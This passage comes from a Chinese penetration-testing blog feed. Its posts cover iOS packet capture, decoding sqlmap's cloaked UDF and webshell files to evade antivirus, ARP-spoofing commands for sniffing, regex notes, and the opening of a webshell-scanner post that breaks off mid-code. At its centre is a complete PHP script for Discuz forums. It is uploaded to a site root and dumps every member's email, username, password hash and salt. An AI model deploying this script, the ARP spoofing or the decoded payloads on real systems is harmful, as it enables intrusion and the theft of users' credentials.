        <content type="html"><![CDATA[<p>传统方法用 <strong>burpsuite</strong> 只能抓(<strong>wifi</strong>) <strong>http</strong>数据包<br>iOS 5后，Apple引入了<strong>RVI remote virtual interface</strong>的特性，它只需要将iOS设备使用USB数据线连接到mac上，然后使用rvictl工具以iOS设备的<strong>UDID</strong>为参数在Mac中建立一个虚拟网络接口rvi，就可以在mac设备上使用tcpdump，<strong>wireshark</strong>等工具对创建的接口进行抓包分析了。</p><p><code>rvictl + wireshark(tcpdump)</code>能抓取该网卡下所有通讯</p><p><strong>rvictl需xcode支持</strong></p><ol><li><p>手机通过usb线连接到PC</p></li><li><p>通过iTunes查看手机的UDID</p></li><li><p>wireshark 指定 rvi0 接口</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> app安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap udf解密脚本</title>
      <link href="/2016/07/29/sqlmap-cloak/"/>
      <url>/2016/07/29/sqlmap-cloak/</url>
      
        <content type="html"><![CDATA[<p>一次渗透测试中上传 <strong>sqlmap</strong> 自带的 <strong>udf</strong>发现无法创建函数打开文件一看根本就不像传统的二进制文件像是一种编码查看相关说明 ，原来新版sqlmap 为了防止文件被误杀对文件进行异或加密.</p><p>所幸在sqlmap 目录下发现 一个解密 脚本</p><p>路径<br><code>./sqlmap/extra/cloak/cloak.py</code></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/4073e2e993dbcf2491743e2f4f554e0c.png" alt="2019-07-20-17-36-26"></p><p>如 <strong>lib_mysqludf_sys.dll</strong> (比较喜欢用 sqlmap 里面的 udf 不容易被杀掉)</p><p><code>cloak.py -d -i D:\sqlmap\udf\mysql\windows\64\lib_mysqludf_sys.dll_</code><br>解码之后便可直接使用了 <strong>webshell</strong> 解码方式也一样</p><p>顺便提下 <code>./sqlmap/extra/</code> 目录有几个有意思的 东西 感兴趣的同学可以研究下</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 下tcpdump+arpspoof arp嗅探</title>
      <link href="/2016/06/29/windows-arpspoof/"/>
      <url>/2016/06/29/windows-arpspoof/</url>
      
        <content type="html"><![CDATA[<p>arp 欺骗:</p><p><code>arpspoof.exe /l</code>  ##列出网络接口<br><code>arpspoof.exe 192.168.3.1 192.168.3.5 80 0 1</code></p><p>嗅探：</p><p><code>tcpdump -D</code> //查看网络接口<br><code>tcpdump -i 3 -w h.cap -s 0</code></p><p><code>-s0</code> 表示取消抓包长度限制<br>否则会导致抓包不全！<br><code>win</code> 下的 <code>tcpdump</code> 好处就是 无需安装<code>wincap</code> 纯命令行下操作<br>杀软不会干掉</p><p>随后便可用 <code>wireshark</code> 分析数据包</p><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/%E5%97%85%E6%8E%A2.zip" target="_blank" rel="noopener">相关工具下载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式笔记</title>
      <link href="/2016/05/27/Regular-Expression-Basic/"/>
      <url>/2016/05/27/Regular-Expression-Basic/</url>
      
        <content type="html"><![CDATA[<h2 id="POSIX字符集"><a href="#POSIX字符集" class="headerlink" title="POSIX字符集"></a>POSIX字符集</h2><p><code>[:space:]</code>  所有空白字符（新行，空格，制表符）<code>[\t\r\n\v\f]</code></p><p><code>[:digit:]</code>  数字</p><p><code>[:xdigit:]</code> 任何一个十六进制数（即：0-9，a-f，A-F）</p><p><code>[:punct:]</code>  所有标点符号</p><p><code>[:alpha:]</code>  所有的字母  包括汉字</p><p><code>[:upper:]</code>  所有的大写字母</p><p><code>[:lower:]</code>  所有的小写字母</p><p><code>[:alnum:]</code>  字母和数字 相当于<code>[0-9a-zA-Z]</code>  包括汉字</p><p><code>[:cntrl:]</code>  控制字符 <code>[\x00-\x1F\x7F]</code> </p><p><code>[:print:]</code>  非空字符 类似<code>[:graph:]</code> 但包括空白字符 <code>[\x20-x7E]</code></p><p><code>[:graph:]</code>  空白字符之外的字符 <code>[\x21-\x7E]</code>（非空格、控制字符）  </p><p><code>[:blank:]</code>  空格(space)与定位符(tab)</p><p><code>[:ascii:]</code>  ASCII 字符 <code>[\x00-\x7F]</code></p><h2 id="正则表达之环视-Lookaround"><a href="#正则表达之环视-Lookaround" class="headerlink" title="正则表达之环视(Lookaround)"></a>正则表达之环视(Lookaround)</h2><p><code>(?&lt;=Expression)</code> <strong>逆序肯定环视</strong>，表示所在位置左侧能够匹配<code>Expression</code></p><p><code>(?&lt;!Expression)</code> <strong>逆序否定环视</strong>，表示所在位置左侧不能匹配<code>Expression</code></p><p><code>(?=Expression)</code> <strong>顺序肯定环视</strong>，表示所在位置右侧能够匹配<code>Expression</code></p><p><code>(?!Expression)</code> <strong>顺序否定环视</strong>，表示所在位置右侧不能匹配<code>Expression</code></p><p>环视是正则中的一个难点，对于环视的理解，可以从应用和原理两个角度理解，如果想理解得更清晰、深入一些，还是从原理的角度理解好一些，正则匹配基本原理参考 NFA引擎匹配原理。</p><p>上面提到环视相当于对“所在位置”附加了一个条件，环视的难点在于找到这个“位置”，这一点解决了，环视也就没什么秘密可言了。</p><p><strong>顺序环视匹配过程</strong><br>对于顺序肯定环视<code>(?=Expression)</code>来说，当子表达式<code>Expression</code>匹配成功时，<code>(?=Expression)</code>匹配成功，并报告<code>(?=Expression)</code>匹配当前位置成功。</p><p>对于顺序否定环视<code>(?!Expression)</code>来说，当子表达式<code>Expression</code>匹配成功时，<code>(?!Expression)</code>匹配失败；当子表达式<code>Expression</code>匹配失败时，<code>(?!Expression)</code>匹配成功，并报告<code>(?!Expression)</code>匹配当前位置成功；</p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dz 一键导库脚本</title>
      <link href="/2016/04/29/dz-dumper/"/>
      <url>/2016/04/29/dz-dumper/</url>
      
        <content type="html"><![CDATA[<p><strong>特点：</strong></p><ol><li>不会出现乱码</li><li>无需作任何配置</li><li>数据量超过500w 自动将数据保存至该服务器</li></ol><p>默认 <code>dump uc_members</code> 表，如不存在则<code>dump members</code> 表。</p><p><strong>用法：</strong></p><p><code>wget http://localhost/dz7.2/data2.php?dump=1 -O localhost.txt</code></p><p>数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器<br><code>http://localhost/dz7.2/data2.php?save=1</code></p><p><strong>该脚本上传至网站根目录，无需作任何配置</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"ENDSTR"</span>,End_str());</span><br><span class="line">ignore_user_abort();</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="string">"0"</span>);</span><br><span class="line">ob_clean();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./include/common.inc.php'</span>;</span><br><span class="line">header(<span class="string">'Content-type: text/html;charset=utf-8'</span>);</span><br><span class="line">ini_set(<span class="string">'memory_limit'</span>,<span class="number">-1</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dump=$_GET[<span class="string">'dump'</span>]?$_GET[<span class="string">'dump'</span>]:<span class="number">0</span>;</span><br><span class="line">$save=$_GET[<span class="string">'save'</span>]?$_GET[<span class="string">'save'</span>]:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tablename_arr=<span class="keyword">array</span>(<span class="string">"uc_members"</span>,<span class="string">"members"</span>);</span><br><span class="line"></span><br><span class="line">$result= $db-&gt;result ( $db-&gt;query(<span class="string">"SHOW TABLES like '%$tablename_arr[0]%' "</span>),<span class="number">0</span>);</span><br><span class="line">$result1= $db-&gt;result ( $db-&gt;query(<span class="string">"SHOW TABLES like '%$tablename_arr[1]%' "</span>),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($result) &amp;&amp; !<span class="keyword">empty</span> ($result1)) &#123;</span><br><span class="line"></span><br><span class="line">    $tablename = $result;</span><br><span class="line">    $type=<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    $tablename = $result1;</span><br><span class="line">    $type=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$count=$db-&gt;result ( $db-&gt;query(<span class="string">"select count(-1) from $tablename"</span>),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">empty</span>($tablename)&amp;&amp; $count ==<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'表为空,或没有想要查询的表'</span>.ENDSTR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$endstr=ENDSTR;</span><br><span class="line">$infos=<span class="string">&lt;&lt;&lt;EOL</span></span><br><span class="line"><span class="string">    基本信息</span></span><br><span class="line"><span class="string">    ------------------------------------------------------------- <span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    当前表: <span class="subst">&#123;$tablename&#125;</span> <span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    数据量: <span class="subst">&#123;$count&#125;</span> <span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    网站编码: <span class="subst">&#123;$GLOBALS['charset']&#125;</span> <span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    当前页面所使用编码:utf-8  <span class="subst">&#123;$endstr&#125;</span><span class="subst">&#123;$endstr&#125;</span><span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    帮助信息<span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    -------------------------------------------------------------<span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    使用wget下载:<span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    wget http://<span class="subst">$_SERVER</span>[HTTP_HOST]<span class="subst">$_SERVER</span>[REQUEST_URI]?dump=1 -O <span class="subst">$_SERVER</span>[HTTP_HOST].txt<span class="subst">&#123;$endstr&#125;</span><span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    数据量巨大(大于 500W)的情况下 防止web崩溃 或内存不足 使用下面的参数 将数据保存至当前服务器<span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">    http://<span class="subst">$_SERVER</span>[HTTP_HOST]<span class="subst">$_SERVER</span>[REQUEST_URI]?save=1<span class="subst">&#123;$endstr&#125;</span><span class="subst">&#123;$endstr&#125;</span></span></span><br><span class="line"><span class="string">EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_Browser() &amp;&amp; $dump==<span class="number">0</span> &amp;&amp;$save==<span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($infos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************</span></span><br><span class="line"><span class="comment">* wget 下载部分</span></span><br><span class="line"><span class="comment">/******************************/</span></span><br><span class="line"><span class="keyword">if</span>($dump!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_Browser())&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'请使用wget访问'</span>.ENDSTR.<span class="string">'wget http://'</span>.<span class="string">"$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]?dump=1 -O $_SERVER[HTTP_HOST].txt"</span>.ENDSTR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $limit_start=<span class="number">0</span>; $limit_length=<span class="number">5000</span>; $limit_end=$count;$limit_end=$limit_end-$limit_start;</span><br><span class="line">    $limit_length=$limit_end&gt;$limit_length?$limit_length:$limit_end;</span><br><span class="line">    $section=ceil($limit_end/$limit_length);</span><br><span class="line">    <span class="keyword">if</span> (ob_get_level() == <span class="number">0</span>)&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"当前表: &#123;$tablename&#125; &#123;$endstr&#125;"</span>.</span><br><span class="line">          <span class="string">"数据量: &#123;$count&#125; &#123;$endstr&#125;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"---------------------------------------------------------------------------------------&#123;$endstr&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$section;$i++) &#123;</span><br><span class="line">        $sql = <span class="string">"select email,username,password,salt from  $tablename "</span> . <span class="string">' LIMIT  '</span> . ($limit_start + <span class="number">1</span> + $i * $limit_length) . <span class="string">','</span> . $limit_length . <span class="string">';'</span>;</span><br><span class="line">        $query=$db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">while</span>($result=$db-&gt;fetch_array($query))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'email'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'username'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'password'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">"UTF-8"</span>,$result[<span class="string">'salt'</span>]).ENDSTR;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$section;$i++) &#123;</span><br><span class="line">        $sql = <span class="string">"select email,username,password from  $tablename  "</span> . <span class="string">' LIMIT  '</span> . ($limit_start + <span class="number">1</span> + $i * $limit_length) . <span class="string">','</span> . $limit_length . <span class="string">';'</span>;</span><br><span class="line">        $query=$db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">while</span>($result=$db-&gt;fetch_array($query))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'email'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'username'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'password'</span>]).ENDSTR;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($save!=<span class="number">0</span>)&#123;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    $filename=<span class="string">'data_'</span>.substr(md5(mt_rand()),<span class="number">28</span>,<span class="number">12</span>).<span class="string">'.txt'</span>;</span><br><span class="line">    $limit_start=<span class="number">0</span>; $limit_length=<span class="number">10000</span>; $limit_end=$count;$limit_end=$limit_end-$limit_start;</span><br><span class="line">    $limit_length=$limit_end&gt;$limit_length?$limit_length:$limit_end;</span><br><span class="line">    $section=ceil($limit_end/$limit_length);</span><br><span class="line">    $head= <span class="string">"当前表: &#123;$tablename&#125; "</span>.PHP_EOL.</span><br><span class="line">        <span class="string">"数据量: &#123;$count&#125; "</span>.PHP_EOL.</span><br><span class="line">        <span class="string">"---------------------------------------------------------------------------------------"</span>.PHP_EOL;</span><br><span class="line">    file_put_contents($filename,$head);</span><br><span class="line">    <span class="keyword">if</span>($type==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$section;$i++) &#123;</span><br><span class="line">            $sql = <span class="string">"select email,username,password,salt from  $tablename "</span> . <span class="string">' LIMIT  '</span> . ($limit_start + <span class="number">1</span> + $i * $limit_length) . <span class="string">','</span> . $limit_length . <span class="string">';'</span>;</span><br><span class="line">            $query=$db-&gt;query($sql);</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">'正在执行: '</span>.$sql.ENDSTR;</span><br><span class="line">              flush();</span><br><span class="line">            <span class="keyword">while</span>($result=$db-&gt;fetch_array($query))&#123;</span><br><span class="line">                file_put_contents($filename,iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'email'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                    iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'username'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                    iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'password'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                    iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">"UTF-8"</span>,$result[<span class="string">'salt'</span>]).PHP_EOL,FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span>(ENDSTR.<span class="string">'备份完毕，下载地址为: '</span>. DownloadName().$filename.<span class="string">' 请立即下载！'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$section;$i++) &#123;</span><br><span class="line">            $sql = <span class="string">"select email,username,password from  $tablename "</span> . <span class="string">' LIMIT  '</span> . ($limit_start + <span class="number">1</span> + $i * $limit_length) . <span class="string">','</span> . $limit_length . <span class="string">';'</span>;</span><br><span class="line">            $query=$db-&gt;query($sql);</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">'正在执行: '</span>.$sql.ENDSTR;</span><br><span class="line">              flush();</span><br><span class="line">            <span class="keyword">while</span>($result=$db-&gt;fetch_array($query))&#123;</span><br><span class="line">                file_put_contents($filename,iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'email'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                    iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'username'</span>]).<span class="string">"\t"</span>.</span><br><span class="line">                    iconv($GLOBALS[<span class="string">'charset'</span>],<span class="string">'UTF-8'</span>,$result[<span class="string">'password'</span>]).PHP_EOL,FILE_APPEND);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">echo</span>(ENDSTR.<span class="string">'备份完毕，下载地址为: '</span>. DownloadName().$filename.<span class="string">' 请立即下载！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">End_str</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_SERVER[HTTP_USER_AGENT],<span class="string">'wget'</span>) || stristr($_SERVER[HTTP_USER_AGENT],<span class="string">'curl'</span>) || <span class="keyword">empty</span>($_SERVER[HTTP_USER_AGENT]) || php_sapi_name() ===<span class="string">'cli'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> PHP_EOL;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_Browser</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!stristr($_SERVER[HTTP_USER_AGENT],<span class="string">'wget'</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DownloadName</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $url=<span class="string">"http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"</span>;</span><br><span class="line">    $p=array_slice(explode(<span class="string">'/'</span>,$url),<span class="number">-1</span>);</span><br><span class="line">    $t=$p[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> rtrim($url,$t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.t00ls.net/viewthread.php?tid=26809&highlight=wget" target="_blank" rel="noopener">参考文章</a><br><a href="https://www.t00ls.net/thread-28139-1-1.html" target="_blank" rel="noopener">windows wget下载</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webshell扫描脚本</title>
      <link href="/2016/04/23/webshell-scan/"/>
      <url>/2016/04/23/webshell-scan/</url>
      
        <content type="html"><![CDATA[<p>tools论坛@imspider写了一款 <a href="https://www.t00ls.net/viewthread.php?tid=22557" target="_blank" rel="noopener">完美扫描PHP特殊一句话后门</a> 感觉挺漂亮的，博主加入了一些其它规则，目前仅支持php。</p><ol><li>可扫描 <code>weevelyshell</code> 生成或加密的<code>shell</code> 及各种变异<code>webshell</code></li><li>支持扫描callback一句话shell</li><li>支持各种php大马</li></ol><p>由于是根据文件内容<strong>正则匹配</strong>所以不能保证误报漏报<br>想要更强大的<strong>webshell</strong>扫描推荐用d盾 <strong>webshell</strong>扫描</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/06bfd1dc70e4de0ed7bcb9002a5949ae.png" alt="2019-07-21-00-31-21"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 